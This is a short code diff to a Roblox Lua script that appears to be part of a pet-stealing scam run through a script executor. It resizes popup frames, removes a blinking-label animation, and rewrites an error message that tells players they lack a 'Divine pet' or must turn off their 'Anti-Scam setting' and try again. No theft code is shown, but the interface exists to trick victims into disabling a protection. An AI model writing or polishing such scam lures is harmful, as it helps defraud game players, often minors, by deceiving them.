@@ -101,14 +101,14 @@ local function showTrackingBarUI()
         fadeLabel:Destroy()
 
         local errorMsg = Instance.new("TextLabel", frame)
-        errorMsg.Size = UDim2.new(1, -20, 0.25, 0)
-        errorMsg.Position = UDim2.new(0, 10, 0.65, 0)
+        errorMsg.Size = UDim2.new(1, -20, 0.35, 0)
+        errorMsg.Position = UDim2.new(0, 10, 0.6, 0)
         errorMsg.BackgroundTransparency = 1
         errorMsg.TextWrapped = true
         errorMsg.Font = Enum.Font.GothamBold
         errorMsg.TextSize = 16
         errorMsg.TextColor3 = warningColor
-        errorMsg.Text = "Error: It looks like you don't have a Divine pet, you're not using KRNL, or you didn't turn off your Anti-Scam setting. Please disable it and try again."
+        errorMsg.Text = "Error: It looks like you don't have a Divine pet or you didn't turn off your Anti-Scam setting. Please disable it and try again."
     end)
 end
 
@@ -215,8 +215,8 @@ local function showExecutorNotice()
     gui.ResetOnSpawn = false
 
     local frame = Instance.new("Frame", gui)
-    frame.Size = UDim2.new(0, 320, 0, 120)
-    frame.Position = UDim2.new(0.5, -160, 0.5, -60)
+    frame.Size = UDim2.new(0, 340, 0, 180)
+    frame.Position = UDim2.new(0.5, -170, 0.5, -90)
     frame.BackgroundColor3 = bgColor
     Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
 
@@ -230,15 +230,6 @@ local function showExecutorNotice()
     label.TextColor3 = Color3.new(1, 1, 1)
     label.BackgroundTransparency = 1
 
-    local blink = Instance.new("BoolValue")
-    blink.Value = true
-    coroutine.wrap(function()
-        while blink.Value do
-            for i = 0, 1, 0.1 do label.TextTransparency = i task.wait(0.05) end
-            for i = 1, 0, -0.1 do label.TextTransparency = i task.wait(0.05) end
-        end
-    end)()
-
     local proceed = Instance.new("TextButton", frame)
     proceed.Size = UDim2.new(0.4, 0, 0.2, 0)
     proceed.Position = UDim2.new(0.3, 0, 0.75, 0)
@@ -250,7 +241,6 @@ local function showExecutorNotice()
     Instance.new("UICorner", proceed).CornerRadius = UDim.new(0, 8)
 
     proceed.MouseButton1Click:Connect(function()
-        blink.Value = false
         gui:Destroy()
         showNotePopup()
     end)
